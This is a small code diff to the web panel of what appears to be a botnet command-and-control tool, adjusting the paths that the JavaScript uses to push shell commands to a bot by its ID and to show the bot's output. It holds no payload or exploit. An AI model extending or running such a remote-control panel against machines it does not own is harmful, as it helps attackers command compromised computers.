@@ -39,12 +39,12 @@
 		    return false;
 		}
 		function send_command(e) {
-		    $.post("../../api/push", {'botid': '{{botid}}', 'cmd': $('#cmd').val()});
+		    $.post("../api/push", {'botid': '{{botid}}', 'cmd': $('#cmd').val()});
 		    $('#cmd').val('');
 		    return false;
 		}
 		function refresh_term() {
-		    $('#terminal').load("../../api/stdout?botid={{botid}}");
+		    $('#terminal').load("../api/stdout?botid={{botid}}");
             if (!$('#terminal').is(':hover')) {
                termdiv = document.getElementById('terminal');
                termdiv.scrollTop = termdiv.scrollHeight;
